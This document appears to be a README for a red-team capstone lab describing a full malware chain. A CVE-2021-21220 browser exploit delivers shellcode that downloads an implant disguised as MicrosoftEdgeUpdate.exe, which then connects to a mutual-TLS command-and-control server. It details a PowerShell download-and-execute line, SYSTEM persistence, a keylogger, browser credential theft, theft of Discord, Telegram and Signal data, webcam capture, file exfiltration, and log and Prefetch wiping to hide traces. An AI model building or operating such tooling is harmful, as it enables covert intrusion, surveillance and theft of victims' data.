# Capstone Docker Lab 


## Exploit Plan

The victim browses to a hosted webpage. The exploit initiates via shellcode embedded in `utils.js` (runs client-side in the victim's browser via CVE-2021-21220). The shellcode runs on the victim's machine, calls the HTTPS delivery server, downloads `MicrosoftEdgeUpdate.exe`, and executes it. Once running, the implant enrolls with the C2 server over one-way TLS to receive a signed certificate, then reconnects over full mutual TLS. The C2 controller receives the connection and presents an interactive reverse-shell menu, allowing the operator to run Windows commands remotely on the victim's machine.

## Tokens and Cryptography — How It All Works

This section covers every token and cryptographic operation in the pipeline in the order they are created and consumed.

### 1. PKI Bootstrap — The Offline CA

`launch.sh` calls `certs/generate_certs.sh`, which creates a private Certificate Authority from scratch on every run:

```
openssl genrsa -out ca.key 4096
openssl req -x509 -new -key ca.key -sha256 -days 365 -out ca.crt -subj "/CN=LabCA"
```

`ca.key` and `ca.crt` are the root of trust for the entire pipeline. Nothing is trusted unless it was signed by this CA. Because they are regenerated each `launch.sh` run, there is no persistent PKI to steal.

**`ca.crt` is embedded in the implant binary** via `implant_certs.h` (a C byte array). The implant uses it to verify the controller's TLS certificate during enrollment and normal operation. **`ca.key` lives only inside the `c2-server` Docker container** — the controller uses it at runtime to sign enrollment CSRs.

### 2. The Enrollment Token (`ENROLLMENT_TOKEN`)

**What it is:** A random 16-byte (32 hex character) string, e.g. `a3f8c12e9b074d5e...`

**Generated by** `launch.sh`:
```bash
ENROLLMENT_TOKEN=$(openssl rand -hex 16)
```
`openssl rand` reads from the OS CSPRNG (Linux: `/dev/urandom`). This is cryptographically unpredictable.

**Where it goes:**
- Written to `.env`
- Baked into the Windows implant binary at compile time via `-DENROLLMENT_TOKEN="a3f8c12e..."` (a preprocessor macro in `implant.c`)
- Passed to the `c2-server` container as an environment variable (`ENROLLMENT_TOKEN=...` in docker-compose)

**How it is used — the enrollment handshake (first run only):**

```
Implant (Windows)                         Controller (Docker)
─────────────────                         ──────────────────
Check C:\Users\Public\MicrosoftEdge\ec.dat
  → not found, proceed with enrollment
tls_init_client_enroll(ca_cert)  ─────→   tls_init_server (SSL_VERIFY_PEER, no FAIL_IF_NO_PEER_CERT)
Generate 2048-bit RSA keypair in memory
Build CSR with CN = ENROLLMENT_TOKEN
tls_client_wrap_enroll (one-way TLS)  ──→  SSL_accept → sees no client cert → enrollment path
Send COMMAND_ENROLL_CSR (CSR bytes)   ──→  Parse CSR
                                           Verify CSR self-signature
                                           Extract CN, compare to getenv("ENROLLMENT_TOKEN")
                                           If match: sign 30-day cert, append serial to whitelist.txt
                                           Mark token as consumed (g_token_used = 1)
                                           Note: controller allows re-enrollment for lab reliability
Receive COMMAND_ENROLL_CERT           ←──  Send signed cert PEM
Encrypt via DPAPI (CryptProtectData)
Write cert PEM → C:\Users\Public\MicrosoftEdge\ec.dat
Write key  PEM → C:\Users\Public\MicrosoftEdge\ek.dat
tls_cleanup(); tls_init_client_mem(
  ca_cert, issued_cert, in_memory_key)
```

**Subsequent runs (reboot / scheduled task restart):**

```
Implant (Windows)
─────────────────
Check C:\Users\Public\MicrosoftEdge\ec.dat → found
Read DPAPI-encrypted cert from ec.dat → CryptUnprotectData
Read DPAPI-encrypted key from ek.dat  → CryptUnprotectData
tls_cert_signed_by_ca(cert, ca_cert)
  → valid: skip enrollment, connect directly over mTLS
  → invalid (CA rotated): delete ec.dat + ek.dat, re-enroll
```

The single-use token is consumed after first run, but the controller permits re-enrollment to "unstick" implants that lose their credentials. Subsequent restarts load credentials from the shared `C:\Users\Public` path, allowing the `SYSTEM` persistence task to use the same certificates generated during the initial user enrollment.

**Security properties:**
- The token is single-use but recoverable: enrollment is protected by the `ENROLLMENT_TOKEN` secret.
- The private key is generated at runtime and **never embedded in the binary**.
- Credential files are stored in `C:\Users\Public\MicrosoftEdge\`, a path accessible across User and SYSTEM contexts.
- **DPAPI Encryption:** Files on disk are encrypted via `CryptProtectData`, tying them to the victim machine and providing protection against offline extraction.
- `COMMAND_SHUTDOWN` deletes `ec.dat` and `ek.dat` — no credentials survive after the operator removes the implant.

### 2a. Credential Storage — DPAPI Protected

After enrollment, `implant.c` writes the cert and key as encrypted blobs:

```
cert blob → C:\Users\Public\MicrosoftEdge\ec.dat
key  blob → C:\Users\Public\MicrosoftEdge\ek.dat
```

On the next startup, both files are read and decrypted using `CryptUnprotectData`.

**Storage approach trade-offs:**

| Approach | What a defender finds | Portability |
|---|---|---|
| Plain PEM | Raw PEM text — readable with any text editor | Portable — file can be copied to another machine |
| DPAPI blob (current) | Binary ciphertext — no PEM headers | **Tied to original Windows machine** |

The DPAPI approach ensures that even if an analyst captures the `.dat` files, they cannot decrypt the private key without access to the victim machine's cryptographic context. Using `C:\Users\Public` instead of `%APPDATA%` ensures the credentials remain available when the implant transitions from a User process to a `SYSTEM` scheduled task.

### 3. The Download Token (`DOWNLOAD_TOKEN`)

**What it is:** A random 32-byte (64 hex character) string, e.g. `cdef06db2e4c43e1...`

**Generated by** `launch.sh`:
```bash
DOWNLOAD_TOKEN=$(openssl rand -hex 32)
```

**Where it goes:**
- Written to `.env`
- Baked into `stager.asm` at build time by the shellcode Makefile (substituted with `sed` into the PowerShell command URL)
- Passed to the `exfil-server` container as a runtime environment variable (so `token_server.js` can read it)

**How it is used:**

The shellcode runs this PowerShell command (simplified):
```powershell
(New-Object Net.WebClient).DownloadFile(
  'https://<HOST_IP>/update/cdef06db2e4c43e1...',
  'C:\Users\Public\i.exe'
)
```

nginx proxies `/update/<token>` to `token_server.js` on `localhost:3000`. The token server:
1. Receives the request and extracts the token from the URL path
2. Compares it to `DOWNLOAD_TOKEN` using a **constant-time comparison loop** (prevents timing oracle attacks where an attacker could determine partial token values by measuring response latency)
3. If valid and not yet consumed: sets `token_valid = false` immediately (before streaming), then serves `MicrosoftEdgeUpdate.exe`
4. If invalid or already consumed: returns `404`

**Security properties:**
- 64 hex characters = 256 bits of entropy — brute-forcing is computationally infeasible
- Single-use: token is burned on first valid download, so sandbox re-downloads and analyst URL extraction both get `404`
- Constant-time comparison prevents timing side-channels

### 4. The Controller Certificate (mTLS — Server Side)

`generate_certs.sh` creates the controller's TLS identity:
```bash
openssl genrsa -out controller.key 2048
openssl req -new -key controller.key -subj "/CN=controller" -out controller.csr
openssl x509 -req -in controller.csr -CA ca.crt -CAkey ca.key -days 365 -out controller.crt
```

The controller presents `controller.crt` during every TLS handshake. The implant verifies it against the embedded `ca.crt`. If the signature does not match (wrong CA, expired, tampered), the implant drops the connection — it will not talk to a rogue server.

### 5. The Implant Certificate (mTLS — Client Side, Runtime-Issued)

Unlike the controller cert, the implant cert **does not exist before the implant runs**. It is issued dynamically during enrollment (see §2 above). Key properties of the issued cert:

| Field | Value |
|---|---|
| Subject CN | The enrollment token (validated, then used as identity) |
| Validity | 30 days from enrollment time |
| Serial | 64-bit cryptographically random (`BN_rand`) |
| Signed by | `ca.key` (inside the controller container) |
| Private key | RSA-2048, generated in memory, never touches disk |

After enrollment, the controller appends the cert's serial number (hex) to `certs/whitelist.txt`. Every subsequent mTLS connection from the implant triggers a whitelist check: the controller reads the connecting cert's serial and searches the file. If the serial is not listed, the connection is rejected. This is the **BP4 revocation mechanism**.

### 6. The Full mTLS Handshake (Post-Enrollment)

After enrollment the implant calls `tls_init_client_mem(ca_cert, issued_cert, in_memory_key)` and reconnects. The TLS 1.3 handshake then performs mutual authentication:

```
Implant                                  Controller
───────                                  ──────────
ClientHello (TLS 1.3)              ──→
                                   ←──  ServerHello + Certificate (controller.crt)
                                         CertificateRequest
Verify controller.crt against ca.crt
Certificate (issued_cert)          ──→  Verify issued_cert against ca.crt
CertificateVerify (RSA-2048 sig)   ──→  Check serial in whitelist.txt
Finished                           ──→
                                   ←──  Finished
═══ TLS 1.3 session established (AES-256-GCM, ECDHE) ═══
```

**What TLS 1.3 with AES-GCM provides:**
- **Confidentiality:** All C2 traffic (commands, responses, file contents) is encrypted with AES-256-GCM. A network observer sees only ciphertext.
- **Integrity:** GCM is an authenticated encryption mode — any tampering with ciphertext is detected and the connection is dropped.
- **Forward secrecy:** ECDHE key exchange means session keys are ephemeral. Capturing the long-term cert private key does not decrypt past sessions.
- **Mutual authentication:** Both sides prove they hold a private key corresponding to a CA-signed certificate. Neither side accepts an unauthenticated peer.

### 7. Traffic Shaping (BP5)

Even with mTLS, a network observer can do **traffic analysis** — inferring operator activity from packet sizes and timing even without reading the content.

**Padding:** Every packet (in `protocol.c`) is padded with `secure_random` bytes to the next 512-byte boundary. A 6-byte `HEARTBEAT` response and a 4096-byte file read response are indistinguishable in size.

**Keepalive:** A background thread in the implant sends `COMMAND_KEEPALIVE` packets at random 20–40 second intervals (jittered with `BCryptGenRandom`). The controller discards them silently. The TCP flow looks identical whether the operator is idle or actively issuing commands.

### Docker Network Segmentation

| Network | Containers | Purpose |
|---|---|---|
| `frontnet` | c2-redirector, delivery-server, exploit-server, exfil-redirector | Victim-facing; handles all inbound connections |
| `backnet` | c2-redirector, c2-server | Internal only; c2-server is unreachable from frontnet |

Both redirectors are **dumb TCP relays** (raw forward, not TLS termination). The full TLS handshake passes through end-to-end unchanged — no certificate or protocol changes were needed. If the redirector IP is burned, point socat at a new backend without recompiling the implant.

## What Each Container Does

### "Machine 1" — c2-redirector (`192.168.56.10:443`)

- Image: `alpine:latest` — no Dockerfile needed
- Command: installs `socat` and runs `socat TCP-LISTEN:443,fork,reuseaddr TCP:c2-server:443`
- Forwards raw TCP bytes from `victim:443` → `c2-server:443` without terminating TLS
- Sits on both `frontnet` (victim-facing) and `backnet` (internal)
- Port `443` bound exclusively to the IP alias — real host IP serves nothing on this port

### "Machine 2" — c2-server (no victim-facing IP)

- Controller binary compiled against system OpenSSL (Linux); interactive terminal menu
- On enrollment (no client cert): validates CSR → signs cert → writes serial to whitelist → burns token
- On normal mTLS connection: whitelist check → HELLO → command loop
- **No host port mapping** — reachable only via c2-redirector on `backnet`
- Carries **commands only** — no bulk data; exfil data goes to exfil-receiver via exfil-redirector

### "Machine 3" — delivery-server (`192.168.56.10:8443`)

- nginx HTTPS server serving `MicrosoftEdgeUpdate.exe` behind a single-use `DOWNLOAD_TOKEN`
- `token_server.js` (Node.js, proxied by nginx) validates token with constant-time comparison and burns it after first use
- Built via `delivery-server/Dockerfile` (shared 4-stage build with exploit-server, `target: delivery-runtime`)

### "Machine 4" — exploit-server (`192.168.56.10:8888`)

- Node.js static server hosting the CVE-2021-21220 (V8 type confusion) exploit page
- `utils.js` shellcode array is patched at build time with the current `C2_HOST_IP` and `DOWNLOAD_TOKEN`
- Built from the same Dockerfile as delivery-server (`target: exploit-runtime`)

### "Machine 5" — exfil-redirector (`192.168.56.10:9443`)

- Image: `alpine:latest` — no Dockerfile needed
- Command: installs `socat` and runs `socat TCP-LISTEN:9443,fork,reuseaddr TCP:exfil-receiver:9443`
- Forwards raw TCP bytes from `implant:9443` → `exfil-receiver:9443` without terminating TLS
- Sits on both `frontnet` (victim-facing) and `exfilnet` (internal)
- Port `9443` bound exclusively to the IP alias — real host IP serves nothing on this port

### "Machine 6" — exfil-receiver (no victim-facing IP)

- Node.js HTTPS server — accepts `POST /exfil/<hostname>/<filename>`
- Sanitizes path, creates per-host directory, streams request body to file under `/opt/exfil/`
- Mounted to `exfil-data/` on the host; saves screenshots (BMP), keylogs (txt), cred DBs, history DBs
- **No host port mapping** — reachable only via exfil-redirector on `exfilnet`
- **Completely separate from the C2 channel** — different port (9443), different TLS cert, different cadence

## Cryptographic Security Summary

| Best Practice | Implementation |
|---|---|
| **BP1** — mTLS with authenticated encryption | TLS 1.3 (AES-256-GCM + ECDHE), mutual cert auth, both sides verified against private CA |
| **BP2** — Enrollment on first contact | Implant carries only CA cert + enrollment token; RSA-2048 keypair generated at runtime; cert issued by controller; private key never on disk |
| **BP3** — CSPRNG for all randomness | `BCryptGenRandom` (Windows), `/dev/urandom` (Linux), `openssl rand` (shell) — no `rand()`/`srand()` anywhere |
| **BP4** — Key lifecycle | Implant cert expires in 30 days; serial whitelist allows instant revocation; whitelist populated at enrollment, not build time |
| **BP5** — Traffic metadata mitigation | 512-byte packet padding (hides payload size); random-interval keepalive (hides operator activity timing) |

## C2 Controller — Concurrent Multi-Implant UI

The controller now manages up to 8 simultaneous implant sessions. A background acceptor thread handles all incoming connections (enrollment, HELLO, persistence detection) while the operator UI runs on the main thread. The operator first selects which implant to task, then enters that implant's command loop.

### Step 1 — Session selection

When you attach to the container (`sudo docker attach c2-server`) you see the live implant list:

```
+------------------------------------------------------------------+
| C2 Controller — Connected Implants                               |
+------------------------------------------------------------------+
  ID    IP Address        OS | Hostname             Persistence
  ----  ----------------  ----------------------------  -----------
  [1]   192.168.1.50      Windows 10.0 | DESKTOP-A1B2  DISABLED
  [2]   192.168.1.75      Windows 10.0 | DESKTOP-C3D4  ENABLED

  [0]  Refresh
  [99] Shutdown All
Select implant>
```

Enter the implant number to enter its command loop, `0` to refresh the list, or `99` to shut down all connected implants at once (prompts for confirmation).

### Step 2 — Command loop for the selected implant

```
+------------------------------------+
| C2 Controller                      |
| Persistence: DISABLED              |
+------------------------------------+
Select a command:
  0 - BACK                       Return to implant list
  1 - HEARTBEAT                  Check implant is alive
  2 - SET_SLEEP                  Make implant sleep N seconds
  3 - SHUTDOWN    (removes implant + task)
  4 - READ_DATA                  Read a file from the target
  5 - WRITE_DATA                 Write a file to the target
  6 - RUN_CMD                    Execute a shell command
  7 - ENABLE PERSISTENCE         Create scheduled task on target
  8 - SCREENSHOT                 Capture victim screen
  9 - CLIPBOARD_GET              Capture clipboard text
 10 - KEYLOG_START               Start keylogger
 11 - KEYLOG_STOP                Stop keylogger
 12 - KEYLOG_DUMP                Dump keylog
 13 - CRED_STEAL                 Harvest browser credentials
 14 - HISTORY_STEAL              Harvest browser history
 15 - CAMERA_SNAPSHOT            Capture webcam photo
 16 - FILE_SEARCH                Index sensitive files under C:\Users\
 17 - MESSAGING_STEAL            Harvest Discord, Telegram & Signal data
 18 - FILE_EXFIL                 Exfiltrate a specific file by path (max 100 MB)
>
```

| Command | What happens |
|---|---|
| BACK | Returns to the session selection list; selected implant stays connected |
| HEARTBEAT | Controller sends ping; implant responds `ALIVE` over mTLS |
| SET_SLEEP | Implant sleeps N seconds then reconnects; session slot is released and the implant reappears as a new session after waking |
| SHUTDOWN | Full self-destruct: (1) deletes scheduled task; (2) spawns hidden PowerShell (`-WindowStyle Hidden -NonInteractive`) that waits 2 s then force-deletes `MicrosoftEdgeUpdate.exe` and the install dir after the process exits — binary is gone immediately, not just at reboot; (3) `MoveFileExA(MOVEFILE_DELAY_UNTIL_REBOOT)` kept as fallback if PowerShell is policy-blocked; (4) wipes `ec.dat`, `ek.dat`, `kl.dat`, `ss.tmp`, removes `C:\Users\Public\MicrosoftEdge\`; (5) deletes Prefetch for all 4 chain binaries; (6) clears 5 Windows Event Logs; controller and other sessions remain alive |
| READ_DATA | Reads a file path on the target; returns up to 4096 bytes |
| WRITE_DATA | Writes arbitrary data to a file path on the target |
| RUN_CMD | Runs a shell command via `CreateProcess(CREATE_NO_WINDOW)` |
| ENABLE PERSISTENCE | Creates `schtasks` entry `MicrosoftEdgeUpdate` (`/ru SYSTEM /rl HIGHEST /sc ONLOGON`) |
| SCREENSHOT | Captures full desktop; session-aware — spawns helper in the active user session if the implant is running as SYSTEM (post-reboot persistence); saved to `exfil-data/<hostname>-<ip>/screenshot_<time>.bmp` |
| CLIPBOARD_GET | Retrieves current clipboard text |
| KEYLOG_START | Starts background keylogger thread (`GetAsyncKeyState` polling); records to `kl.dat` |
| KEYLOG_STOP | Stops the keylogger thread |
| KEYLOG_DUMP | Retrieves recorded keystrokes; saved to `exfil-data/<hostname>-<ip>/keylog_<time>.txt` |
| CRED_STEAL | Decrypts Edge/Chrome Master Key via DPAPI, copies Login Data SQLite DB; saved to `exfil-data/<hostname>-<ip>/` |
| HISTORY_STEAL | Copies Edge/Chrome History SQLite DB; saved to `exfil-data/<hostname>-<ip>/` |
| CAMERA_SNAPSHOT | Captures one webcam frame (Media Foundation, RGB24/RGB32); session-aware helper same as screenshot; saved as `camera_<time>.bmp` |
| FILE_SEARCH | Recursively walks `C:\Users\` (depth ≤ 10) collecting paths matching 21 extensions (.docx .pdf .xlsx .pptx .txt .rtf .odt .csv .pem .key .p12 .pfx .ppk .zip .7z .rar .sqlite .db .kdbx .1pux .psafe3); exfils as `files_<time>.txt` — one path per line |
| MESSAGING_STEAL | Copies Discord LevelDB (*.ldb/*.log), Telegram tdata direct-child files (≤5 MB each), and Signal sql\db.sqlite + config.json (≤100 MB cap); uses CopyFileA to bypass app file locks; exfils as `messaging_<time>.bin` |
| FILE_EXFIL | Operator pastes a path from the FILE_SEARCH index; implant size-checks (rejects >100 MB), reads via direct or temp-copy fallback, POSTs to exfil-receiver under the original filename |
| Shutdown All (`99`) | Sends SHUTDOWN to every live session sequentially; prompts for confirmation first; prints per-implant result |
